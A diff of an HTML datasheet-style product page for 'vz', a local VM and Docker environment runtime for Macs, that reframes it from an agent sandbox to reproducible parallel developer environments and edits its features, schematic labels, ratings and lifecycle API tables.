@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>vz: Sandbox Runtime for Agentic Workloads (Future-State Specification)</title>
-<meta name="description" content="vz: local-first sandbox runtime for agentic workloads. Real Linux VMs on Apple-silicon Macs via Virtualization.framework. Every workload executes in the guest. The host stays clean.">
+<title>vz: Reproducible Developer Environments (Product Specification)</title>
+<meta name="description" content="vz creates reproducible, parallel Developer Environments on local hardware. Linux is the universal target, with native macOS environments today and native Windows planned.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@62..125,400..900&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
@@ -322,9 +322,9 @@
 <body>
 <!--
 DIRECTION CONTRACT — seed 074dd045 · mode PERSUADE · code-led
-THESIS: vz is specified, not marketed — the page is a semiconductor datasheet for a sandbox runtime, and the truth table is the pitch: every agent action resolves to HOST EFFECT: NONE.
+THESIS: vz is specified, not marketed — the page is a semiconductor datasheet for reproducible, parallel Developer Environments, with the host×target matrix and environment ownership model as the pitch.
 OWN-WORLD: cream laid-paper ground, warm ink, engineering blue for measured/live data, signal red for planned/guarded states; hairline rules, flat print surfaces, zero radius, zero shadow; Archivo expanded grotesque for the part identity, IBM Plex Sans/Mono for document body and data (Plex is the subject's native lettering — engineered documentation).
-STORY: a developer evaluating agent sandboxes reads vz like a part they can order: the boundary schematic shows dockerd itself living in the guest; the pin configuration shows the MCP interface as a real IC; the bench proves the NONE claim interactively; revision history keeps every future feature honestly labeled.
+STORY: a developer evaluating local environments reads vz like a part they can order: the schematic separates host from target, the register map names one environment lifecycle, the bench shows independent environments, and the roadmap labels every future pairing honestly.
 FIRST VIEWPORT: datasheet masthead — gpu-cli brandline, "FUTURE-STATE SPECIFICATION" stamp, giant part number vz with the function line, document meta table right (doc no, rev, date, status), then features column beside general description prose, all above the fold rules.
 FORM: The Datasheet — IMPECCABLE'S PICK card, rank 1 of my grounded list; the roll assigned The Launch Console (index 4); the user locked the pick. Canon declined.
 FINISH: unreviewed and undocumented is unfinished; this build ends with the finish review, the verdict, DESIGN.md, and every shipping raster carrying its provenance.
@@ -346,8 +346,8 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
     <div class="mast-head">
       <div>
         <div class="partno">vz</div>
-        <p class="partfn">Sandbox runtime for <em>agentic&nbsp;workloads</em></p>
-        <p class="partsub">One binary. Real Linux VMs on your Mac. Every workload executes in the guest; the host stays clean.</p>
+        <p class="partfn">Reproducible <em>Developer&nbsp;Environments</em></p>
+        <p class="partsub">Linux on every host. Native environments where the platform supports them. Parallel by construction.</p>
       </div>
       <div class="docmeta">
         <table aria-label="Document metadata">
@@ -355,7 +355,7 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
           <tr><th scope="row">Revision</th><td>F — future state</td></tr>
           <tr><th scope="row">Issued</th><td>September 2026</td></tr>
           <tr><th scope="row">Supersedes</th><td>v0.3.20 datasheet</td></tr>
-          <tr><th scope="row">Host&nbsp;req.</th><td>macOS 14+, Apple&nbsp;Silicon</td></tr>
+          <tr><th scope="row">Current&nbsp;host</th><td>macOS 14+, Apple&nbsp;Silicon</td></tr>
           <tr><th scope="row">License</th><td>MIT</td></tr>
         </table>
       </div>
@@ -369,22 +369,22 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
     <div>
       <h2 class="feat-h" id="feat-h">Features</h2>
       <ul class="features">
-        <li><span class="tick">▪</span><span><b>Real isolation, not seatbelt.</b> Full Linux VM per sandbox via Apple Virtualization.framework<sup class="fn">1</sup></span></li>
-        <li><span class="tick">▪</span><span><b>~3&nbsp;s cold boot</b> to first command, warm reuse thereafter<sup class="fn">2</sup></span></li>
-        <li><span class="tick">▪</span><span><b>Host stays clean.</b> Zero workload processes on macOS, including the Docker daemon itself<sup class="fn">3</sup></span></li>
-        <li><span class="tick">▪</span><span><b>Agent-native interface.</b> MCP tool register, streaming exec, file API, signed receipts<sup class="fn">4</sup></span></li>
-        <li><span class="tick">▪</span><span><b>Containers in the guest.</b> OCI images via youki; deterministic Compose stacks; BuildKit builds</span></li>
-        <li><span class="tick">▪</span><span><b>Disposable by design.</b> Checkpoint, restore, fork, destroy: a sandbox costs nothing to throw away</span></li>
-        <li><span class="tick">▪</span><span><b>Local-first, cloud-optional.</b> Same runtime contract when Linux hosts arrive later</span></li>
+        <li><span class="tick">▪</span><span><b>Environment first.</b> One identity owns target, files, compute, network, state, tools, and lifecycle</span></li>
+        <li><span class="tick">▪</span><span><b>Linux everywhere.</b> Linux-on-macOS now; Linux-on-Linux next; Linux-on-Windows later</span></li>
+        <li><span class="tick">▪</span><span><b>Native where it matters.</b> macOS-on-macOS now; Windows-on-Windows follows Linux-on-Windows</span></li>
+        <li><span class="tick">▪</span><span><b>Docker is implicit for Linux.</b> Each Linux environment owns a private Engine, context, state, and cache</span></li>
+        <li><span class="tick">▪</span><span><b>Parallel by construction.</b> No shared mutable identity, socket, port, network, cache, or credential state</span></li>
+        <li><span class="tick">▪</span><span><b>Honest capabilities.</b> Host×target support is reported as ACTIVE, DEV, or PLANNED</span></li>
+        <li><span class="tick">▪</span><span><b>Hardened when requested.</b> Lockdown remains a secondary profile, not the product center</span></li>
       </ul>
     </div>
     <div>
       <h2 class="desc-h" id="desc-h">1 · General description</h2>
       <div class="desc">
-        <p class="lede"><strong>vz</strong> is a local-first sandbox runtime for the way software is written in 2026: an agent that compiles, installs, executes, and exfiltrates, inside a Linux VM that boots in about three seconds, mounts your project through VirtioFS, and never lets a single instruction touch macOS.<sup class="fn">3</sup></p>
-        <p>An agent's riskiest command becomes a non-event. <span class="none-em">The host effect is NONE</span> — no host processes, no host files, no host sockets. And when the run is over,, the sandbox is checkpointed, restored, or destroyed in one command.</p>
-        <p>vz is one CLI for three runtimes: OCI containers (youki, in-guest), Compose-class stacks (deterministic reconciler), and raw Linux VMs (custom 6.12.85 kernel, two profiles)<sup class="fn">5</sup>. The control plane (a gRPC daemon and local HTTP API) is built for orchestrators: leases, events, receipts, capability negotiation.<sup class="fn">4</sup></p>
-        <p>Revision F specifies the future state this document sells: the runtime data plane completed (streaming exec, file API), full Docker compatibility with the daemon living <em>inside</em> the guest<sup class="fn">3</sup>, and the MCP register map of §4. Each table below carries its honest status.</p>
+        <p class="lede"><strong>vz</strong> creates reproducible, parallel Developer Environments on local hardware. The environment—not its VM, container, or sandbox—is the product object. It binds a project or worktree to a target operating system, stable identity, compute, files, tools, network, persistent state, and lifecycle.</p>
+        <p><span class="none-em">Linux is the universal target.</span> It runs in a Virtualization.framework VM on macOS today, will run natively on Linux, and later runs through an appropriate Windows virtualization backend. Native macOS complements Linux now; native Windows comes after Linux-on-Windows.</p>
+        <p>Every Linux Developer Environment includes private Docker as part of readiness: its own Engine, containerd, BuildKit cache, images, volumes, networks, endpoint, and managed Docker context. There is no global vz Docker socket and no fallback to Docker Desktop or another environment.</p>
+        <p>Current runtime and VM mechanisms are real; the unified <code>vz dev</code> lifecycle and full host-Docker-CLI parity remain in development. Native targets report their own capabilities instead of silently inheriting Linux or OCI behavior.</p>
         <p class="foot">Status vocabulary: <span class="tag tag-active">ACTIVE</span> shipped in v0.3.20 · <span class="tag tag-dev">DEV</span> in development · <span class="tag tag-planned">PLANNED</span> committed roadmap, subject to change.</p>
       </div>
     </div>
@@ -398,39 +398,39 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
       <h2 id="arch-h"><span class="no">2</span>Typical application: the boundary</h2>
       <span class="seclabel">Figure 1</span>
     </div>
-    <p>This is the whole product in one schematic. The host runs three things: your agent, the vz CLI, and a control daemon. Everything else (the guest kernel, youki, <b>dockerd itself</b>, BuildKit) executes inside the Linux VM. Data crosses the boundary only through declared VirtioFS mounts, the vsock control channel, and NAT egress.<sup class="fn">3</sup></p>
+    <p>This is the current Linux-on-macOS backend, one implementation of the shared Developer Environment contract. The host runs clients and the control plane; Linux workloads, dockerd, containerd, BuildKit, and youki execute inside the selected environment's VM. Native macOS environments use a separate macOS target adapter.</p>
     <div class="figure">
       <div class="figwrap">
-        <svg viewBox="0 0 1180 560" role="img" aria-label="Schematic: host on the left with agent, CLI, control daemon, and docker client; guest VM on the right with kernel, guest agent, youki, dockerd and buildkitd; connected by vsock, VirtioFS and NAT buses across a virtualization boundary line.">
+        <svg viewBox="0 0 1180 560" role="img" aria-label="Linux-on-macOS schematic: host clients and control plane on the left; one selected Linux Developer Environment on the right with kernel, guest agent, youki, dockerd, containerd, and BuildKit; connected by declared control, project-share, network, and private Engine endpoint channels.">
           <!-- boundary -->
           <line x1="640" y1="24" x2="640" y2="520" stroke="#a33327" stroke-width="1.4" stroke-dasharray="7 5"/>
-          <text x="640" y="542" text-anchor="middle" font-family="IBM Plex Mono" font-size="11.5" letter-spacing="2.4" fill="#a33327">HARDWARE VIRTUALIZATION BOUNDARY · NOTHING CROSSES UNLESS DECLARED</text>
+          <text x="640" y="542" text-anchor="middle" font-family="IBM Plex Mono" font-size="11.5" letter-spacing="2.0" fill="#a33327">ENVIRONMENT BOUNDARY · HOST EFFECTS REQUIRE DECLARED CHANNELS</text>
 
           <!-- host block -->
           <text x="60" y="52" font-family="Archivo" font-size="15" font-weight="700" letter-spacing="2.2" fill="#1f1c18">HOST · macOS · APPLE SILICON</text>
           <rect x="60" y="66" width="470" height="440" fill="none" stroke="#1f1c18" stroke-width="1.6"/>
-          <text x="76" y="88" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">HNDLS: 0 UNTRUSTED PROCESSES</text>
+          <text x="76" y="88" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">HOST BACKEND: VIRTUALIZATION.FRAMEWORK</text>
 
           <rect x="92" y="106" width="406" height="58" fill="rgba(15,76,129,0.06)" stroke="#0f4c81" stroke-width="1.3"/>
-          <text x="108" y="130" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#1f1c18">AGENT RUNTIME</text>
-          <text x="108" y="149" font-family="IBM Plex Mono" font-size="11" fill="#5a5347">Claude Code · Codex · OpenCode · any MCP client</text>
+          <text x="108" y="130" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#1f1c18">DEVELOPER + AGENT CLIENTS</text>
+          <text x="108" y="149" font-family="IBM Plex Mono" font-size="11" fill="#5a5347">shell · IDE · Docker CLI · agent · automation</text>
 
           <rect x="92" y="184" width="190" height="58" fill="none" stroke="#1f1c18" stroke-width="1.3"/>
           <text x="108" y="208" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#1f1c18">vz CLI</text>
-          <text x="108" y="227" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">vz run · stack · build</text>
+          <text x="108" y="227" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">vz dev · current compatibility commands</text>
 
           <rect x="308" y="184" width="190" height="58" fill="none" stroke="#1f1c18" stroke-width="1.3"/>
           <text x="324" y="208" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#1f1c18">vz-runtimed</text>
           <text x="324" y="227" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">gRPC control plane</text>
 
           <rect x="92" y="262" width="406" height="58" fill="none" stroke="#a33327" stroke-width="1.2" stroke-dasharray="5 4"/>
-          <text x="108" y="286" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#a33327">DOCKER / COMPOSE CLIENT</text>
-          <text x="108" y="305" font-family="IBM Plex Mono" font-size="10.5" fill="#a33327">DOCKER_HOST=unix://~/.vz/docker.sock · PLANNED §5</text>
+          <text x="108" y="286" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#a33327">MANAGED DOCKER CONTEXT</text>
+          <text x="108" y="305" font-family="IBM Plex Mono" font-size="10.5" fill="#a33327">one private endpoint per Linux environment · DEV</text>
 
           <rect x="92" y="340" width="406" height="120" fill="none" stroke="#1f1c18" stroke-width="1.2"/>
           <text x="108" y="364" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#1f1c18">STATE</text>
           <text x="108" y="386" font-family="IBM Plex Mono" font-size="10.8" fill="#5a5347">~/.vz/  kernels · images · caches · receipts</text>
-          <text x="108" y="406" font-family="IBM Plex Mono" font-size="10.8" fill="#5a5347">vz.json  per-project sandbox spec</text>
+          <text x="108" y="406" font-family="IBM Plex Mono" font-size="10.8" fill="#5a5347">vz.json  reproducible environment definition</text>
           <text x="108" y="426" font-family="IBM Plex Mono" font-size="10.8" fill="#5a5347">mounts   the ONLY shared bytes (declared)</text>
 
           <!-- buses host->guest -->
@@ -442,13 +442,13 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
           <text x="560" y="482" font-family="IBM Plex Mono" font-size="10.5" letter-spacing="1.6" fill="#0f4c81">VIRTIOFS · PROJECT MOUNTS</text>
 
           <!-- guest block -->
-          <text x="700" y="52" font-family="Archivo" font-size="15" font-weight="700" letter-spacing="2.2" fill="#1f1c18">GUEST · LINUX VM · DISPOSABLE</text>
+          <text x="700" y="52" font-family="Archivo" font-size="15" font-weight="700" letter-spacing="2.2" fill="#1f1c18">TARGET · LINUX · ENVIRONMENT</text>
           <rect x="700" y="66" width="420" height="440" fill="rgba(15,76,129,0.045)" stroke="#0f4c81" stroke-width="1.8"/>
-          <text x="716" y="88" font-family="IBM Plex Mono" font-size="10.5" fill="#0f4c81">SANDBOX · RUNS ALL THE WORK</text>
+          <text x="716" y="88" font-family="IBM Plex Mono" font-size="10.5" fill="#0f4c81">STABLE IDENTITY · PRIVATE MUTABLE STATE</text>
 
           <rect x="724" y="106" width="372" height="46" fill="none" stroke="#0f4c81" stroke-width="1.3"/>
           <text x="740" y="126" font-family="IBM Plex Sans" font-weight="700" font-size="13" fill="#0f4c81">vz GUEST KERNEL 6.12.85</text>
-          <text x="740" y="143" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">developer / container profiles · cgroup v2 · overlayfs · netns</text>
+          <text x="740" y="143" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">Developer / Hardened profiles · cgroup v2 · netns</text>
 
           <rect x="724" y="170" width="372" height="46" fill="none" stroke="#1f1c18" stroke-width="1.3"/>
           <text x="740" y="190" font-family="IBM Plex Sans" font-weight="700" font-size="13" fill="#1f1c18">GUEST AGENT</text>
@@ -464,7 +464,7 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
 
           <rect x="724" y="298" width="372" height="46" fill="rgba(163,51,39,0.05)" stroke="#a33327" stroke-width="1.2" stroke-dasharray="5 4"/>
           <text x="740" y="318" font-family="IBM Plex Sans" font-weight="700" font-size="13" fill="#a33327">dockerd + containerd</text>
-          <text x="740" y="335" font-family="IBM Plex Mono" font-size="10.5" fill="#a33327">FULL DOCKER, IN THE GUEST · PLANNED §5</text>
+          <text x="740" y="335" font-family="IBM Plex Mono" font-size="10.5" fill="#a33327">PRIVATE DOCKER PER ENVIRONMENT · DEV §5</text>
 
           <rect x="724" y="362" width="372" height="44" fill="none" stroke="#1f1c18" stroke-width="1.2"/>
           <text x="740" y="381" font-family="IBM Plex Sans" font-weight="700" font-size="12.5" fill="#1f1c18">CHECKPOINT / RESTORE · fs_quick · vm_full</text>
@@ -478,7 +478,7 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
           <text x="1080" y="452" text-anchor="middle" font-family="IBM Plex Mono" font-size="9.6" fill="#a33327">EGRESS POLICY · PLANNED §6</text>
         </svg>
       </div>
-      <p class="figcap"><b>Figure 1.</b> Typical application. Dashed elements are specified by this revision and not yet active. The docker client on the host is a client only: the daemon it talks to lives in the guest.</p>
+      <p class="figcap"><b>Figure 1.</b> Linux-on-macOS. Dashed elements remain in development. The host Docker client selects one managed context; its daemon and mutable Docker state belong to that Linux environment. Other host×target pairs keep the same identity and lifecycle while changing backend adapters.</p>
     </div>
   </section>
 
@@ -488,26 +488,26 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
   <section class="sec" aria-labelledby="max-h">
     <div class="sec-h">
       <h2 id="max-h"><span class="no">3</span>Absolute maximum ratings</h2>
-      <span class="seclabel">Stresses beyond these are the point</span>
+      <span class="seclabel">Ownership and support limits</span>
     </div>
-    <p>The agent is the stress. These limits define what may happen; the host column defines what may never happen, no matter what the agent does.</p>
+    <p>These ratings define the environment boundary and make target-specific limits explicit. Parallel environments may share immutable inputs, but never mutable ownership.</p>
     <div class="tbl-wrap">
       <table class="tbl">
         <thead>
           <tr><th>Parameter</th><th>Min</th><th>Typ</th><th>Max</th><th>Unit / Condition</th></tr>
         </thead>
         <tbody>
-          <tr><td>Sandbox cold boot to first command</td><td>–</td><td class="t-mono">~3<sup class="fn">2</sup></td><td>–</td><td class="t-dim">s, first run after install; warm reuse is instant</td></tr>
-          <tr><td>Host processes executing agent code</td><td>0</td><td class="t-mono">0</td><td class="t-mono">0</td><td class="t-dim">processes: invariant, not a target<sup class="fn">3</sup></td></tr>
-          <tr><td>Host bytes visible to the sandbox</td><td>–</td><td class="t-mono">declared mounts only</td><td class="t-mono">~/.ssh, keychain, secrets excluded</td><td class="t-dim">via VirtioFS, read-write as declared</td></tr>
+          <tr><td>Linux-on-macOS cold boot to first command</td><td>–</td><td class="t-mono">~3<sup class="fn">2</sup></td><td>–</td><td class="t-dim">s, repository-stated typical; warm reuse follows</td></tr>
+          <tr><td>Mutable Docker owners per Linux environment</td><td>1</td><td class="t-mono">1</td><td class="t-mono">1</td><td class="t-dim">Engine, state, cache, network, endpoint, context</td></tr>
+          <tr><td>Host bytes visible to an environment</td><td>–</td><td class="t-mono">declared shares only</td><td class="t-mono">policy bounded</td><td class="t-dim">target-specific share backend</td></tr>
           <tr><td>Concurrent macOS guest VMs</td><td>1</td><td class="t-mono">–</td><td class="t-mono">2</td><td class="t-dim">kernel-enforced; Linux guest VMs not so limited</td></tr>
-          <tr><td>Guest memory / CPUs per sandbox</td><td class="t-mono">–</td><td class="t-mono">8 / 4</td><td class="t-mono">host RAM − reserve</td><td class="t-dim">GiB / cores, per vz.json resources</td></tr>
+          <tr><td>Memory / CPUs per environment</td><td class="t-mono">–</td><td class="t-mono">8 / 4</td><td class="t-mono">host RAM − reserve</td><td class="t-dim">GiB / cores, configurable per definition</td></tr>
           <tr><td>Checkpoint restore (fs_quick)</td><td>–</td><td class="t-mono">seconds</td><td>–</td><td class="t-dim">workspace-scoped snapshot class</td></tr>
-          <tr><td>Host effect of any agent action</td><td>–</td><td class="t-mono">NONE</td><td class="t-mono">NONE</td><td class="t-dim">see Truth Table, §7</td></tr>
+          <tr><td>Cross-environment mutable state</td><td>0</td><td class="t-mono">0</td><td class="t-mono">0</td><td class="t-dim">fail-closed isolation invariant</td></tr>
         </tbody>
       </table>
     </div>
-    <p class="note">Note: "declared mounts only" is the honest version of isolation. The project directory you mount round-trips read-write. That is the design, visible and inspectable. Nothing undeclared crosses.</p>
+    <p class="note">Declared shares, ports, credentials, and control channels are visible parts of the contract. Unsupported capabilities fail explicitly; vz does not substitute another target or route to another environment.</p>
   </section>
 
   <hr class="rule">
@@ -515,36 +515,36 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
   <!-- ─────────────── 4 · pin configuration: MCP interface ─────────────── -->
   <section class="sec" aria-labelledby="pin-h">
     <div class="sec-h">
-      <h2 id="pin-h"><span class="no">4</span>Pin configuration: agent interface</h2>
-      <span class="seclabel">Figure 2 · MCP register map<sup class="fn">4</sup></span>
+      <h2 id="pin-h"><span class="no">4</span>Pin configuration: environment lifecycle</h2>
+      <span class="seclabel">Figure 2 · proposed unified surface</span>
     </div>
-    <p>vz is agent-native, not agent-compatible. The future-state register map presents ten tools to any MCP client; each pin's status reflects the underlying primitive, because the MCP server itself is <span class="tag tag-planned">PLANNED</span>.</p>
+    <p>Humans, agents, IDEs, and automation should address the same Developer Environment. This proposed register names the unified lifecycle; current compatibility commands remain available while the surface is <span class="tag tag-dev">DEV</span>.</p>
     <div class="figure">
       <div class="figwrap">
-        <svg viewBox="0 0 1180 470" role="img" aria-label="IC package diagram: a chip labeled vz with ten pins. Left pins 1-5: sandbox create, exec, read file, write file, list dir. Right pins 6-10: checkpoint, restore, set network, preview URL, destroy sandbox. Each pin marked active, dev, or planned.">
+        <svg viewBox="0 0 1180 470" role="img" aria-label="IC package diagram for the proposed Developer Environment lifecycle: create, start, exec, read file, write file, checkpoint, restore, set network, inspect, and delete.">
           <!-- left pin wires -->
           <g font-family="IBM Plex Mono" font-size="12.5" fill="#1f1c18">
             <line x1="300" y1="90"  x2="470" y2="90"  stroke="#1f1c18" stroke-width="1.3"/><rect x="470" y="86" width="10" height="8" fill="#1f1c18"/>
-            <text x="292" y="94"  text-anchor="end">1 · vz_create_sandbox</text>
+            <text x="292" y="94"  text-anchor="end">1 · environment_create</text>
             <line x1="300" y1="150" x2="470" y2="150" stroke="#1f1c18" stroke-width="1.3"/><rect x="470" y="146" width="10" height="8" fill="#1f1c18"/>
-            <text x="292" y="154" text-anchor="end">2 · vz_exec</text>
+            <text x="292" y="154" text-anchor="end">2 · environment_start</text>
             <line x1="300" y1="210" x2="470" y2="210" stroke="#1f1c18" stroke-width="1.3"/><rect x="470" y="206" width="10" height="8" fill="#1f1c18"/>
-            <text x="292" y="214" text-anchor="end">3 · vz_read_file</text>
+            <text x="292" y="214" text-anchor="end">3 · environment_exec</text>
             <line x1="300" y1="270" x2="470" y2="270" stroke="#1f1c18" stroke-width="1.3"/><rect x="470" y="266" width="10" height="8" fill="#1f1c18"/>
-            <text x="292" y="274" text-anchor="end">4 · vz_write_file</text>
+            <text x="292" y="274" text-anchor="end">4 · environment_read_file</text>
             <line x1="300" y1="330" x2="470" y2="330" stroke="#1f1c18" stroke-width="1.3"/><rect x="470" y="326" width="10" height="8" fill="#1f1c18"/>
-            <text x="292" y="334" text-anchor="end">5 · vz_list_dir</text>
+            <text x="292" y="334" text-anchor="end">5 · environment_write_file</text>
 
             <line x1="710" y1="90"  x2="880" y2="90"  stroke="#1f1c18" stroke-width="1.3"/><rect x="700" y="86" width="10" height="8" fill="#1f1c18"/>
-            <text x="898" y="94">6 · vz_checkpoint</text>
+            <text x="898" y="94">6 · environment_checkpoint</text>
             <line x1="710" y1="150" x2="880" y2="150" stroke="#1f1c18" stroke-width="1.3"/><rect x="700" y="146" width="10" height="8" fill="#1f1c18"/>
-            <text x="898" y="154">7 · vz_restore</text>
+            <text x="898" y="154">7 · environment_restore</text>
             <line x1="710" y1="210" x2="880" y2="210" stroke="#1f1c18" stroke-width="1.3"/><rect x="700" y="206" width="10" height="8" fill="#1f1c18"/>
-            <text x="898" y="214">8 · vz_set_network</text>
+            <text x="898" y="214">8 · environment_set_network</text>
             <line x1="710" y1="270" x2="880" y2="270" stroke="#1f1c18" stroke-width="1.3"/><rect x="700" y="266" width="10" height="8" fill="#1f1c18"/>
-            <text x="898" y="274">9 · vz_preview_url</text>
+            <text x="898" y="274">9 · environment_inspect</text>
             <line x1="710" y1="330" x2="880" y2="330" stroke="#1f1c18" stroke-width="1.3"/><rect x="700" y="326" width="10" height="8" fill="#1f1c18"/>
-            <text x="898" y="334">10 · vz_destroy_sandbox</text>
+            <text x="898" y="334">10 · environment_delete</text>
           </g>
 
           <!-- pin status dots -->
@@ -561,9 +561,9 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
           <rect x="480" y="60" width="220" height="310" fill="#f7f4ec" stroke="#1f1c18" stroke-width="2"/>
           <circle cx="508" cy="88" r="7" fill="none" stroke="#1f1c18" stroke-width="1.4"/>
           <text x="590" y="215" text-anchor="middle" font-family="Archivo" font-weight="800" font-size="84" fill="#1f1c18" letter-spacing="-2">vz</text>
-          <text x="590" y="252" text-anchor="middle" font-family="IBM Plex Mono" font-size="12" letter-spacing="2.2" fill="#5a5347">SANDBOX RUNTIME</text>
+          <text x="590" y="252" text-anchor="middle" font-family="IBM Plex Mono" font-size="12" letter-spacing="2.0" fill="#5a5347">DEVELOPER ENVIRONMENT</text>
           <text x="590" y="272" text-anchor="middle" font-family="IBM Plex Mono" font-size="10.5" letter-spacing="1.4" fill="#5a5347">VZ-FS-2026-001 · REV F</text>
-          <text x="590" y="346" text-anchor="middle" font-family="IBM Plex Mono" font-size="10.5" letter-spacing="1.4" fill="#a33327">MCP SERVER · PLANNED</text>
+          <text x="590" y="346" text-anchor="middle" font-family="IBM Plex Mono" font-size="10.5" letter-spacing="1.4" fill="#a33327">UNIFIED LIFECYCLE · DEV</text>
 
           <!-- status legend -->
           <g font-family="IBM Plex Mono" font-size="11.5">
@@ -573,7 +573,7 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
           </g>
         </svg>
       </div>
-      <p class="figcap"><b>Figure 2.</b> Agent interface, package view. Same surfaces exposed over the gRPC runtime API and local HTTP API for orchestrators.</p>
+      <p class="figcap"><b>Figure 2.</b> Proposed unified lifecycle, package view. Exact command and API spelling remains DEV; the stable semantics are identity, target, lifecycle, capabilities, and fail-closed selection.</p>
     </div>
 
     <div class="tbl-wrap">
@@ -582,16 +582,16 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
           <tr><th>Pin</th><th>Tool</th><th>Function</th><th>Primitive</th><th>Status</th></tr>
         </thead>
         <tbody>
-          <tr><td class="t-num">1</td><td class="t-mono">vz_create_sandbox</td><td>Provision VM + mount + optional main container from an image ref or vz.json</td><td class="t-dim">daemon lifecycle</td><td><span class="tag tag-dev">DEV</span></td></tr>
-          <tr><td class="t-num">2</td><td class="t-mono">vz_exec</td><td>Run a command; stream stdout/stderr/stdin; PTY; signal; timeout</td><td class="t-dim">youki + guest agent</td><td><span class="tag tag-active">ACTIVE</span> <span class="tag tag-dev">DEV</span> stream API</td></tr>
-          <tr><td class="t-num">3</td><td class="t-mono">vz_read_file</td><td>Read guest file bytes or text</td><td class="t-dim">files API</td><td><span class="tag tag-dev">DEV</span></td></tr>
-          <tr><td class="t-num">4</td><td class="t-mono">vz_write_file</td><td>Write guest file (atomic)</td><td class="t-dim">files API</td><td><span class="tag tag-dev">DEV</span></td></tr>
-          <tr><td class="t-num">5</td><td class="t-mono">vz_list_dir</td><td>List guest directory entries + metadata</td><td class="t-dim">files API</td><td><span class="tag tag-dev">DEV</span></td></tr>
-          <tr><td class="t-num">6</td><td class="t-mono">vz_checkpoint</td><td>Snapshot workspace state (fs_quick), tagged, retained by policy</td><td class="t-dim">checkpoint engine</td><td><span class="tag tag-active">ACTIVE</span></td></tr>
-          <tr><td class="t-num">7</td><td class="t-mono">vz_restore</td><td>Restore sandbox to checkpoint; fork from checkpoint</td><td class="t-dim">checkpoint engine</td><td><span class="tag tag-active">ACTIVE</span></td></tr>
-          <tr><td class="t-num">8</td><td class="t-mono">vz_set_network</td><td>Block-all egress + domain/IP allowlist for the sandbox</td><td class="t-dim">egress policy</td><td><span class="tag tag-planned">PLANNED</span></td></tr>
-          <tr><td class="t-num">9</td><td class="t-mono">vz_preview_url</td><td>Publish a guest port to the host as a reachable URL</td><td class="t-dim">port forward</td><td><span class="tag tag-planned">PLANNED</span></td></tr>
-          <tr><td class="t-num">10</td><td class="t-mono">vz_destroy_sandbox</td><td>Tear down VM + state; everything dies with it</td><td class="t-dim">daemon lifecycle</td><td><span class="tag tag-active">ACTIVE</span></td></tr>
+          <tr><td class="t-num">1</td><td class="t-mono">environment_create</td><td>Persist identity, target specification, ownership, and reproducible inputs</td><td class="t-dim">environment service</td><td><span class="tag tag-dev">DEV</span></td></tr>
+          <tr><td class="t-num">2</td><td class="t-mono">environment_start</td><td>Reconcile the target backend and standard target capabilities</td><td class="t-dim">host + target adapters</td><td><span class="tag tag-dev">DEV</span></td></tr>
+          <tr><td class="t-num">3</td><td class="t-mono">environment_exec</td><td>Stream command I/O, PTY, signals, cancellation, and exit status</td><td class="t-dim">guest agent / native adapter</td><td><span class="tag tag-active">ACTIVE</span> <span class="tag tag-dev">DEV</span></td></tr>
+          <tr><td class="t-num">4</td><td class="t-mono">environment_read_file</td><td>Read target file bytes or text within policy</td><td class="t-dim">files API</td><td><span class="tag tag-dev">DEV</span></td></tr>
+          <tr><td class="t-num">5</td><td class="t-mono">environment_write_file</td><td>Write a target file atomically within policy</td><td class="t-dim">files API</td><td><span class="tag tag-dev">DEV</span></td></tr>
+          <tr><td class="t-num">6</td><td class="t-mono">environment_checkpoint</td><td>Snapshot state where the target reports support</td><td class="t-dim">checkpoint adapter</td><td><span class="tag tag-active">ACTIVE</span></td></tr>
+          <tr><td class="t-num">7</td><td class="t-mono">environment_restore</td><td>Restore or fork with target-qualified portability</td><td class="t-dim">checkpoint adapter</td><td><span class="tag tag-active">ACTIVE</span></td></tr>
+          <tr><td class="t-num">8</td><td class="t-mono">environment_set_network</td><td>Apply explicit egress and published-port policy</td><td class="t-dim">network adapter</td><td><span class="tag tag-planned">PLANNED</span></td></tr>
+          <tr><td class="t-num">9</td><td class="t-mono">environment_inspect</td><td>Report host, target, backend, lifecycle, ownership, and capabilities</td><td class="t-dim">environment service</td><td><span class="tag tag-dev">DEV</span></td></tr>
+          <tr><td class="t-num">10</td><td class="t-mono">environment_delete</td><td>Remove only the selected environment's owned state and endpoints</td><td class="t-dim">environment service</td><td><span class="tag tag-dev">DEV</span></td></tr>
         </tbody>
       </table>
     </div>
@@ -608,17 +608,17 @@ FINISH: unreviewed and undocumented is unfinished; this build ends with the fini
     <div class="clauses">
 
       <article class="clause">
-        <div class="clause-h"><span class="cno">5.1</span>Host / guest boundary</div>
+        <div class="clause-h"><span class="cno">5.1</span>Environment identity &amp; target</div>
